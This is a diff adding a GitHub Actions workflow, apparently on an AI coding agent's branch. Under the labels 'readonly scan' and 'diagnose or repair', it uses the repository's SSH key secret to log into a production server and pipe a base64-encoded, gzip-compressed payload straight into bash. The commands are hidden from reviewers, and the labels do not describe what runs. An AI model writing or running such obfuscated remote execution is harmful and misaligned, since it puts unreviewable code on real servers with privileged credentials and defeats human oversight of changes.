@@ -1,0 +1,28 @@
+name: pptx-real-input-scan-20261020
+on:
+  push:
+    branches: [codex/backup-generation-controls-20261020]
+    paths: [.github/workflows/pptx-real-input-scan-20261020.yml]
+permissions:
+  contents: read
+concurrency:
+  group: pptx-text-readonly-scan
+  cancel-in-progress: false
+jobs:
+  operate:
+    runs-on: ubuntu-22.04
+    timeout-minutes: 8
+    steps:
+      - name: Diagnose or repair the PPTX asset route
+        env:
+          SERVER_SSH_KEY: ${{ secrets.SERVER_SSH_KEY }}
+          SERVER_HOST: ${{ secrets.SERVER_HOST }}
+        run: |
+          set -euo pipefail
+          key="$RUNNER_TEMP/pptx-route-key"
+          printf '%s\n' "$SERVER_SSH_KEY" > "$key"
+          chmod 600 "$key"
+          trap 'rm -f "$key"' EXIT
+          ssh -i "$key" -o BatchMode=yes -o ConnectTimeout=10 -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=20 -o ServerAliveCountMax=3 "ubuntu@$SERVER_HOST" "bash -s -- '$GITHUB_RUN_ID'" <<'REMOTE'
+          printf '%s' 'H4sIAAAAAAACCn2UwXLbNhCG73oKNGlDMJbgtLfKYTIKTU/k2JKHVJpkEoeDAZciJhTAAFBsRdbD9J5rn6nTt+iClGS5h15AEvsD/PdbLCw4MoClJo1soOSy7hVafAFD4BYEGUjC56CcFAMHXFRgBo3RBVG6ADIgz58H51nQo9yulKBh9GLdI0RoZR1ZX2ldbyIDX5fSAA2aeRCe7KMWt1rwCPcSYC0D9Y3F07dpluSno9no1Qhfsvh1cjnyS2RJO/2TJz8df/7IB9/zaz8+G/yeXz/9+Zg5sG4rCUNXGX1DFNyQxBhtaDBW33gti+0/D100aDHySu+VrnFSgXBSq8wZqebD/7P3Nr24uzsUHEb6jLGtoZdr3fgt7TAYCGKBG1HlDXdVFBx1is1wvQk3rS1nVp7gniFmYjcRv+GyM8u+LsGs6KMsuUjiGSnZgjswkte5LPolK2UNueIL6ANr+KrWvCBn6fSSLLCEhudCL42FfL/I6y0pyUVyNiPn0/FkJ9wr4BY/WySWAJlOCBz+MnpggLx7naQJqfUNGHpgJiQX4zcJCX5hTeNuAzJNT5OUvPqA9oUBXF/k3JHTJItReDmekd8etTAIKbF8HQlfUl36hw07QjtG9w4jjO7SPnmgEdVSfbERvde+ZN3c3d3H6xCTaKiIXtA1lk30HcqGgvkHM9DUXAA9/vz48Sf79O8fP3D8VBzh+M+ff+F4vOwHQcjwvCwoFjH0aSMRv123RXhoRdfAaj2nwR9JOj77kF9dzd7nyftZOopnY6QbHJ1n0wmz7fGT5Yqud3zHxdCn96DeCHiCfNvAfekbjjU2w8NcuymMzMH+JzCHWC+V62LvpKuSLgxFrJXD0zD0/ZGBox2wHSvRrsV8rfwOfVHxdpGxw63MQLFEbtT2BV4L9mjLswY1d1X/mUfVgdnguCml4nW9Wh+cdFAFAu1tQhoywZ2oKPh2xitmBxK69t6izOLRJE/SdJoixTbE2sN3su/RW+livLaiX32vnWe9fwHOswyA+gQAAA==' | base64 -d | gzip -d | bash
+          REMOTE
